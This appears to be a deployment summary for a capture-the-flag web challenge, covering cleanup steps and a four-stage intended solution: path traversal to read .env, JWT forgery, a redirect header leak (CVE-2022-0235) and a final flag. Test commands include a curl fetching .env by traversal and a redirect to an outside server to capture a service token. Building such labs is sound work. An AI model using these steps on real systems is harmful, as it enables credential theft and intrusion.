# Production Deployment Summary

## Changes Made for Production Readiness

### 1. Documentation
- ✅ Created `SOLUTION.md` - Complete walkthrough with all exploits, secrets, and flags
  - Contains Stage 1-4 detailed exploitation steps
  - Includes all environment secrets and credentials
  - Added to `.gitignore` to prevent accidental commits
  
- ✅ Updated `README.md` - Clean public version
  - Removed all vulnerability details
  - Removed all hints and step-by-step instructions
  - Kept only essential setup and rules
  - No exposition of endpoints or attack vectors

### 2. Frontend Changes (`public/admin.html`)
- ✅ Removed "Get Admin Flag (FLAG1)" button
- ✅ Removed "Get Service Flag (FLAG2)" button
- ✅ Removed "Test Redirect Endpoint" helper button
- ✅ Removed "Check API Health" helper button
- ✅ Removed all placeholder text and hints
- ✅ Cleaned up form labels (no examples)
- ✅ Removed hint box entirely
- ✅ Simplified admin.js - kept only the core API request handler

### 3. Web Server (`web/app.js`)
- ✅ Removed verbose console logging on startup
- ✅ Removed env_loaded flag from `/healthz` endpoint
- ✅ Simplified `/api/admin-flag` response (no explanations)
- ✅ Kept JWT validation intact
- ✅ Kept service token forwarding in admin-request intact

### 4. API Server (`api/app.js`)
- ✅ Updated `/api/flag` to check Authorization header directly
- ✅ Removed example URLs from error messages
- ✅ Removed endpoint listing from `/api/health`
- ✅ Removed endpoint listing from `/` root endpoint
- ✅ Removed console logging from redirect endpoint
- ✅ Removed verbose startup logging
- ✅ Removed version info from responses

### 5. .gitignore
- ✅ Added `SOLUTION.md` to prevent distribution
- ✅ Added standard Node.js excludes
- ✅ Added IDE and OS excludes

## Progressive Gating (Anti-Cheese Protection)

### Stage 1: Path Traversal
- Players must extract `.env` file via `/download?path=.env`
- This reveals: `WEB_JWT_SECRET`, `SERVICE_TOKEN`, and flag hints

### Stage 2: JWT Forgery → Admin Access
- Players use extracted `WEB_JWT_SECRET` to forge admin JWT
- Only with valid JWT can they access:
  - `/admin` dashboard
  - `/api/admin-request` endpoint
  - `/api/admin-flag` endpoint (confirms FLAG1)

### Stage 3: Redirect Header Leak
- Only accessible from admin dashboard (requires Stage 2)
- Using `/api/admin-request`, they exploit `/api/redirect`
- CVE-2022-0235 leaks the `SERVICE_TOKEN` header

### Stage 4: Final Flag
- `/api/flag` requires valid `SERVICE_TOKEN` in Authorization header
- Only obtainable from Stage 3
- Returns FLAG2

**No cheesing possible**: FLAG2 requires valid SERVICE_TOKEN header, which cannot be obtained without exploiting the redirect in the admin client.

## Pre-Production Checklist

Before deploying:

- [ ] Delete `SOLUTION.md` from production environment
- [ ] Verify `.gitignore` includes `SOLUTION.md`
- [ ] Update environment variables with production secrets:
  - `WEB_JWT_SECRET` - Generate strong random value
  - `SERVICE_TOKEN` - Generate strong random value
  - `FLAG1` - Set to unique flag
  - `FLAG2` - Set to unique flag
- [ ] Test complete exploitation flow locally
- [ ] Verify no hints appear anywhere
- [ ] Verify all console logs are production-ready
- [ ] Test that Stage 1 players cannot access FLAG2
- [ ] Test that forged JWT without Stage 1 fails

## Local Testing Commands

```bash
# Test Stage 1: Path Traversal
curl "http://localhost:8080/download?path=.env"

# Extract WEB_JWT_SECRET and SERVICE_TOKEN from output
# Then create JWT with extracted secret and test Stage 2

# Test Stage 3: Admin Request (with valid JWT)
# Use browser DevTools or curl with cookie to POST to /api/admin-request
# with path: /api/redirect?to=http://your-server.com

# Verify Stage 4: Check that FLAG2 requires SERVICE_TOKEN
curl "http://localhost:3001/api/flag"  # Should get 401
curl "http://localhost:3001/api/flag" \
  -H "Authorization: Bearer invalid" # Should get 403
curl "http://localhost:3001/api/flag" \
  -H "Authorization: Bearer service-token-123" # Should work locally
```
